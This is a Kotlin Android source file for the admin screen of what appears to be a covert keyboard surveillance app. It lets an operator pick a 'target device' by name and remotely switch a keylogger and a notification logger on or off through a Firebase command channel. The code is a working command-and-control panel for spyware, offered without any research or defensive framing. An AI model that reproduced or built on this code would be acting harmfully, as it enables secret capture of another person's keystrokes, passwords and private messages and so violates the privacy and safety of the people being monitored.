package com.example.mykeyboard

import android.app.Activity
import android.graphics.Color
import android.os.Bundle
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.Toast
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

class AdminActivity : Activity() {

    private lateinit var etDeviceName: EditText
    private lateinit var controlPanel: LinearLayout
    private lateinit var btnToggleKeyLog: Button
    private lateinit var btnToggleNotifLog: Button

    private var currentDeviceRef: DatabaseReference? = null
    private var isKeyloggingEnabled = true
    private var isNotificationEnabled = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin)

        etDeviceName = findViewById(R.id.etDeviceName)
        controlPanel = findViewById(R.id.controlPanel)
        btnToggleKeyLog = findViewById(R.id.btnToggleKeyLog)
        btnToggleNotifLog = findViewById(R.id.btnToggleNotifLog)
        val btnConnectDevice = findViewById<Button>(R.id.btnConnectDevice)

        btnConnectDevice.setOnClickListener {
            val device = etDeviceName.text.toString().trim()
            if (device.isEmpty()) {
                Toast.makeText(this, "Please enter target device model name", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            attachDeviceListener(device)
        }

        btnToggleKeyLog.setOnClickListener {
            isKeyloggingEnabled = !isKeyloggingEnabled
            currentDeviceRef?.child("keylogging")?.setValue(isKeyloggingEnabled)
            updateUI()
        }

        btnToggleNotifLog.setOnClickListener {
            isNotificationEnabled = !isNotificationEnabled
            currentDeviceRef?.child("notifications")?.setValue(isNotificationEnabled)
            updateUI()
        }
    }

    private fun attachDeviceListener(deviceName: String) {
        currentDeviceRef?.removeEventListener(deviceListener)
        currentDeviceRef = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName)
        currentDeviceRef?.addValueEventListener(deviceListener)
        controlPanel.visibility = View.VISIBLE
        Toast.makeText(this, "Connected to remote device: $deviceName", Toast.LENGTH_SHORT).show()
    }

    private val deviceListener = object : ValueEventListener {
        override fun onDataChange(snapshot: DataSnapshot) {
            val key = snapshot.child("keylogging").getValue(Boolean::class.java)
            if (key != null) isKeyloggingEnabled = key

            val notif = snapshot.child("notifications").getValue(Boolean::class.java)
            if (notif != null) isNotificationEnabled = notif

            updateUI()
        }

        override fun onCancelled(error: DatabaseError) {
            Toast.makeText(this@AdminActivity, "Error: ${error.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun updateUI() {
        if (isKeyloggingEnabled) {
            btnToggleKeyLog.text = "Remote Key Logger: ENABLED"
            btnToggleKeyLog.setBackgroundColor(Color.parseColor("#388E3C"))
        } else {
            btnToggleKeyLog.text = "Remote Key Logger: DISABLED"
            btnToggleKeyLog.setBackgroundColor(Color.parseColor("#C62828"))
        }

        if (isNotificationEnabled) {
            btnToggleNotifLog.text = "Remote Notification Logger: ENABLED"
            btnToggleNotifLog.setBackgroundColor(Color.parseColor("#388E3C"))
        } else {
            btnToggleNotifLog.text = "Remote Notification Logger: DISABLED"
            btnToggleNotifLog.setBackgroundColor(Color.parseColor("#C62828"))
        }
    }
}
